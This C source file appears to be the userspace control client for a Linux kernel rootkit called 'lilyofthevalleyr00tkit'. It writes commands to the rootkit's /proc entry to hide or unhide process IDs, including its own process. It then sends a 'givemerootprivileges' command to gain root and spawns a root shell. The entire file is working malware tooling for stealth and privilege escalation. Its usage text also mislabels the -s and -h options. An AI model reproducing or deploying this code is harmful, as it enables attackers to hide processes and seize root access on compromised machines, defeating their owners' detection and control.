#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <math.h>

/*
rootkit's sanity check
*/

/*
./client [-s PID_TO_HIDE] [-h PID_TO_UNHIDE] [-c]

[-c] hide current process
[-s] hide PID_TO_HIDE
[-h] unhide PID_TO_UNHIDE
*/


#define RTKIT_HIDEPID_CMD 	"hidepid"
#define RTKIT_UNHIDEPID_CMD	"unhidepid"
#define RTKIT_GETROOTPERM_CMD	"givemerootprivileges"


#define RTKIT_PROCFS_ENTRYNAME 	"/proc/lilyofthevalleyr00tkit"

#define CURRENT_PROCESS 1

#define BUF_SIZE 16

#define usage_err_msg "[Usage] ./client [-s PID_TO_UNHIDE] [-h PID_TO_HIDE] [-c]\n"
#define pid_err "[ERROR] pid exceeds maximum limit\n"

#define OPTS_STR "+:h:s:c"


#define __err(msg,prnt_func,err_code)		\
	do{					\
		prnt_func(msg);			\
		return err_code;		\
	}while(0)


#define usage_err(errmsg,opt)		\
	do{				\
		printf(errmsg,opt);	\
		printf(usage_err_msg);	\
		return -1;		\
	}while(0)


#define pid_hide_unhide(fd,pidvar,cmd_buf,cmd,curproc,errmsg)			\
	do{									\
		if (curproc)							\
		{								\
			pidvar = getpid();					\
		}								\
		else								\
		{								\
			pidvar = atoi(optarg);					\
			if ((pidvar > ((int)pow(2,22))) || (pidvar <= -1))	\
				__err(errmsg pid_err,printf,-1);		\
		}								\
		memset(cmd_buf,0x0,BUF_SIZE);					\
		sprintf(cmd_buf,cmd"%d",pidvar);				\
		if (write(fd,cmd_buf,strlen(cmd_buf)) < 0)			\
			__err(errmsg,perror,-1);				\
	}while(0)



int main(int argc,char **argv)
{
	char hidepid_cmd[BUF_SIZE];
	char unhidepid_cmd[BUF_SIZE];
	int opt,fd;
	pid_t cur_pid,hidden_pid,unhidden_pid;


	fd = open(RTKIT_PROCFS_ENTRYNAME,O_RDWR);

	if (fd < 0)
		__err("[__ERROR_1__]",perror,-1);

	while((opt = getopt(argc,argv,OPTS_STR)) != -1)
	{
		switch (opt)
		{
			case 's':
				//unhide given pid
				pid_hide_unhide(fd,
						unhidden_pid,
						unhidepid_cmd,
						RTKIT_UNHIDEPID_CMD,
						!CURRENT_PROCESS,
						"[__ERROR_2__]");
				break;
			case 'h':
				//hide given pid
				pid_hide_unhide(fd,
						hidden_pid,
						hidepid_cmd,
						RTKIT_HIDEPID_CMD,
						!CURRENT_PROCESS,
						"[__ERROR_3__]");
				break;
			case 'c':
				//hide current process id
				pid_hide_unhide(fd,
						cur_pid,
						hidepid_cmd,
						RTKIT_HIDEPID_CMD,
						CURRENT_PROCESS,
						"[__ERROR_4__]");
				break;
			case '?':
				usage_err("[__ERROR__]unrecognized option [%c]\n",optopt);
				break;
			case ':':
				usage_err("[__ERROR__]missing argument to [%c] option\n",optopt);
		}
	}

	//get root privileges
	if (write(fd,RTKIT_GETROOTPERM_CMD,strlen(RTKIT_GETROOTPERM_CMD)) < 0)
		__err("[__ERROR_5__]",perror,-1);

	
	system("/bin/sh");
}
